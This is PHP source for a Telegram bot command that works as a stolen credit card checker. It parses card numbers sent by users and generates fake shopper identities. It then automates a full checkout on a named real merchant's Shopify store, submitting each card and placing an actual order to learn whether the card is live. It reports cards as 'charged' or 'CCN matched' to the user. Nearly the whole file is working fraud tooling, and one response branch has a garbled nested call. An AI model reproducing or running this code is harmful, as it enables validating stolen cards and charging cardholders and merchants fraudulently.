<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/sh2 ") === 0 || strpos($message, ".sh2 ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            $c1 = substr($cc, 0, 4); 
            $c2 = substr($cc, 4, 4); 
            $c3 = substr($cc, 8, 4); 
            $c4 = substr($cc, -4);
        

##########################################################CHECKER PART#######################################################  

            /////////////////////////////////////////////////////////////////////////////////////
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            ///////////////////////////////////////////////////////////////////////////////////////////////////////
            @unlink('cookie.txt');
            error_reporting(0);
            date_default_timezone_get('America/Buenos_Aires');
            
            function GetStr($string, $start, $end){
            $str = explode($start, $string);
            $str = explode($end, $str[1]);
            return $str[0];
            }
            function multiexplode($seperator, $string){
            $one = str_replace($seperator, $seperator[0], $string);
            $two = explode($seperator[0], $one);
            return $two;
            }
            
            function Capture($str, $starting_word, $ending_word){
            $subtring_start  = strpos($str, $starting_word);
            $subtring_start += strlen($starting_word);   
            $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;
            return substr($str, $subtring_start, $size);
            };
            
            
            if (number_format($mes) < 10){$mes = str_replace("0", "", $mes);};
            
            if (!file_exists(getcwd().'/Cookies')) mkdir(getcwd().'/Cookies', 0777, true);
            $dexy = getcwd().'/Cookies/shin'.uniqid('obu', true).'.txt';
            
            
            
            #------[Winscribe]------#
            
            $proxy = [
                'socks-us.windscribe.com:1080',
                'socks-nl.windscribe.com:1080',
              ];
            
            if (isset($proxy)){
            $ip = "Proxy Live ✅";
            }
            if (empty($proxy)){
            $ip = "Proxy Dead ❌";
            }
            //echo '['.$ip.'] <br>';
            
            #------[Rand]------#
            
            $DET    = file_get_contents("https://randomuser.me/api/1.2/?nat=us");
            $first  = trim(strip_tags(getStr($DET,'"first":"','"')));
            $last   = trim(strip_tags(getStr($DET,'"last":"','"')));
            $street = trim(strip_tags(getStr($DET,'"street":"','"')));
            $city   = trim(strip_tags(getStr($DET,'"city":"','"')));
            $state  = trim(strip_tags(getStr($DET,'"state":"','"')));
            $Zip    = trim(strip_tags(getStr($DET,'"postcode":',',"')));
            $seed   = trim(strip_tags(getStr($DET,'"seed":"','"')));
            
#------[CURL-1]------#

$ch = curl_init("https://everythingsummercamp.com/collections/girls-socks");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$Headers = ['authority: everythingsummercamp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl1 = curl_exec($ch);

#------[CURL-]------#

$ch = curl_init("https://everythingsummercamp.com/cart/add.js");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$Headers = ['authority: everythingsummercamp.com',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://everythingsummercamp.com',
'Referer: https://everythingsummercamp.com/collections/girls-socks/products/wicking-athletic-socks?variant=15511254073459',
'referer: https://everythingsummercamp.com/',
'x-requested-with: XMLHttpRequest',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_POSTFIELDS, 'new_item=false&closeout=false&x_left=false&best_seller=false&quantity=1&id=15511254073459&option-0=Dark+Green&option-1=Size+9-11');
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl3 = curl_exec($ch);

#------[CURL]------#

$ch = curl_init("https://everythingsummercamp.com/cart.js");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$Headers = ['authority: everythingsummercamp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'referer: https://everythingsummercamp.com/collections/girls-socks/products/wicking-athletic-socks?variant=15511254073459',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl5 = curl_exec($ch);


#------[CURL]------# 

$ch = curl_init("https://everythingsummercamp.com/cart");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$Headers = ['authority: everythingsummercamp.com',
'content-type: application/x-www-form-urlencoded',
'origin: https://everythingsummercamp.com',
'referer: https://everythingsummercamp.com/collections/girls-socks/products/wicking-athletic-socks?variant=15511254073459',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_POSTFIELDS, 'updates%5B%5D=1&note=&checkout=');
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl6 = curl_exec($ch);
$Location = Capture($curl6, 'location:', 'strict-transport-security');
$id_1   = trim(strip_tags(getStr($Location,'https://everythingsummercamp.com/','/checkouts/')));
$id_2   = trim(strip_tags(getStr($Location,'/checkouts/','x-sorting-hat-podid:')));
echo "Location: $Location<br><hr>";

echo "Key 1:$id_1<br><hr>";

echo "Key 2:$id_2<br><hr>";
#------[CURL-7]------#

$ch = curl_init('https://everythingsummercamp.com/'.$id_1.'/checkouts/'.$id_2.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$Headers = ['authority: everythingsummercamp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'referer: https://everythingsummercamp.com/collections/girls-socks/products/wicking-athletic-socks?variant=15511254073459',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl7 = curl_exec($ch);
$authenticity_token  = trim(strip_tags(getStr($curl7,'input type="hidden" name="authenticity_token" value="','"')));

#------[CURL-8]------#

$ch = curl_init('https://everythingsummercamp.com/'.$id_1.'/checkouts/'.$id_2.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$Headers = ['authority: everythingsummercamp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'content-type: application/x-www-form-urlencoded',
'Origin: https://everythingsummercamp.com',
'referer: https://everythingsummercamp.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($authenticity_token).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.$name.''.rand(1,99).'@gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Battributes%5D%5BCamp+Attending%5D=&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$first.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$last.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.$street.'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10010&checkout%5Bshipping_address%5D%5Bphone%5D=%28512%29+333-9591&checkout%5Bclient_details%5D%5Bbrowser_width%5D=788&checkout%5Bclient_details%5D%5Bbrowser_height%5D=937&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl8 = curl_exec($ch);

#------[CURL-9]------#

$ch = curl_init('https://everythingsummercamp.com/'.$id_1.'/checkouts/'.$id_2.'?previous_step=contact_information&step=shipping_method');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$Headers = ['authority: everythingsummercamp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'referer: https://everythingsummercamp.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl9 = curl_exec($ch);
$authenticity = trim(strip_tags(getStr($curl9,'<input type="hidden" name="authenticity_token" value="','"')));

#------[CURL-10]------#

$ch = curl_init('https://everythingsummercamp.com/'.$id_1.'/checkouts/'.$id_2.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$Headers = ['authority: everythingsummercamp.com',
'content-type: application/x-www-form-urlencoded',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'origin: https://everythingsummercamp.com',
'referer: https://everythingsummercamp.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.urlencode($authenticity).'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=usps-FirstPackage-3.87&checkout%5Bclient_details%5D%5Bbrowser_width%5D=788&checkout%5Bclient_details%5D%5Bbrowser_height%5D=937&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl10 = curl_exec($ch);

#------[CURL-11]------#

$ch = curl_init('https://everythingsummercamp.com/'.$id_1.'/checkouts/'.$id_2.'?previous_step=shipping_method&step=payment_method');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$Headers = ['authority: everythingsummercamp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'referer: https://everythingsummercamp.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl11 = curl_exec($ch);
$authen = trim(strip_tags(getStr($curl11,'<input type="hidden" name="authenticity_token" value="','"')));

#------[CURL-12]------#

$ch = curl_init('https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$Headers = ['Accept: application/json',
'Content-Type: application/json',
'Host: deposit.us.shopifycs.com',
'Origin: https://checkout.shopifycs.com',
'Referer: https://checkout.shopifycs.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_POSTFIELDS,'{"credit_card":{"number":"'.$c1.' '.$c2.' '.$c3.' '.$c4.'","name":"'.$first.' '.$last.'","month":'.$mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"everythingsummercamp.com"}');
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl12 = curl_exec($ch);
$id = trim(strip_tags(getStr($curl12,'"id":"','"')));

#------[CURL-13]------#

$ch = curl_init('https://everythingsummercamp.com/'.$id_1.'/checkouts/'.$id_2.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$Headers = ['authority: everythingsummercamp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://everythingsummercamp.com',
'referer: https://everythingsummercamp.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_POSTFIELDS,'_method=patch&authenticity_token='.urlencode($authen).'&previous_step=payment_method&step=&s='.$id.'&checkout%5Bpayment_gateway%5D=63756828787&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B15123339591&checkout%5Btotal_price%5D=1086&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=788&checkout%5Bclient_details%5D%5Bbrowser_height%5D=937&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl13 = curl_exec($ch);

#------[CURL-14]------#

$ch = curl_init('https://everythingsummercamp.com/'.$id_1.'/checkouts/'.$id_2.'/processing');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$Headers = ['authority: everythingsummercamp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'referer: https://everythingsummercamp.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl14 = curl_exec($ch);
sleep(3);
#------[CURL-15]------#

$ch = curl_init('https://everythingsummercamp.com/'.$id_1.'/checkouts/'.$id_2.'/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$Headers = ['authority: everythingsummercamp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'referer: https://everythingsummercamp.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl15 = curl_exec($ch);

#------[CURL-16]------#

$ch = curl_init('https://everythingsummercamp.com/'.$id_1.'/checkouts/'.$id_2.'?from_processing_page=1&validate=true');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$Headers = ['authority: everythingsummercamp.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'referer: https://everythingsummercamp.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',];
curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $dexy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $dexy);
$curl16 = curl_exec($ch);
$ERROR  = trim(strip_tags(getStr($curl16,'class="notice__content"><p class="notice__text">','</p>')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr_replace($time, '',4);
            

######################END OF CHECKER PART################################################################################
            
            
            if(substr_count($curl16, 'Thank You for your order')) {
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» CVV Matched [Payment Success] ✅
Response -» Approved ( Charged 10$ )
Gateway -» Shopify
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
        
              elseif(substr_count($curl16, 'Security code was not matched by the processor')) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CCN Matched [CVV2 Failure] ✅
    Response -» Approved (Security code was not matched by the processor)
    Gateway -» Shopify
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}

              else{
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
  <b>Status -» Dead ❌
  Response -» $ERROR
  Gateway -» Shopify
  Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
            
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>